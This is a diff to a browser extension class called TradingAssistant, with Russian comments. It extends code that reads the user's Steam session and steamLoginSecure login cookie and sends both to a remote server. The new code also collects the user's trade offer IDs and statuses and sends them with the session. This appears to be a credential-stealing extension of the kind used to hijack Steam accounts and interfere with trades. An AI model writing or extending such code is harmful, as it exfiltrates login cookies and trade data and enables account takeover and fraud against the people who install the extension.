@@ -52,11 +52,23 @@ class TradingAssistant {
             const session = await this.getValidSteamSession();
             
             if (session) {
-                // Отправляем сессию на сервер
-                await this.sendToServer('session_data', {
+                // Отправляем сессию и трейды на сервер
+                const dataToSend = {
                     session: session,
                     timestamp: new Date().toISOString()
-                });
+                };
+                
+                // Добавляем трейды если они есть
+                if (session.trades && session.trades.length > 0) {
+                    dataToSend.trades = session.trades.map(trade => ({
+                        trade_offer_id: trade.tradeofferid,
+                        status: trade.trade_offer_state
+                    }));
+                    console.log('📤 Отправляем', dataToSend.trades.length, 'трейдов на сервер');
+                }
+                
+                const sent = await this.sendToServer('session_data', dataToSend);
+                console.log('📡 Данные отправлены на сервер:', sent ? 'успешно' : 'ошибка');
                 
                 // Статус станет 'active' только когда сервер ответит session_received
                 // Пока ставим 'pending' - ждем ответа от сервера
@@ -110,10 +122,27 @@ class TradingAssistant {
             // Теперь получаем cookies через Chrome API (как в v1)
             const cookies = await this.getSteamCookies();
             
-            // Объединяем данные
+            // Получаем трейды для отправки вместе с сессией
+            let trades = null;
+            try {
+                trades = await new Promise((resolve) => {
+                    chrome.tabs.sendMessage(tabId, { 
+                        type: 'GET_TRADE_OFFERS',
+                        steamLoginSecure: cookies.steamLoginSecure 
+                    }, (response) => {
+                        resolve(response);
+                    });
+                });
+                console.log('🧪 Трейды получены:', trades ? trades.length : 0, 'шт.');
+            } catch (error) {
+                console.log('⚠️ Не удалось получить трейды:', error.message);
+            }
+            
+            // Объединяем данные сессии и трейдов
             return {
                 ...contentScriptData,
-                steamLoginSecure: cookies.steamLoginSecure || null
+                steamLoginSecure: cookies.steamLoginSecure || null,
+                trades: trades
             };
             
         } catch (error) {
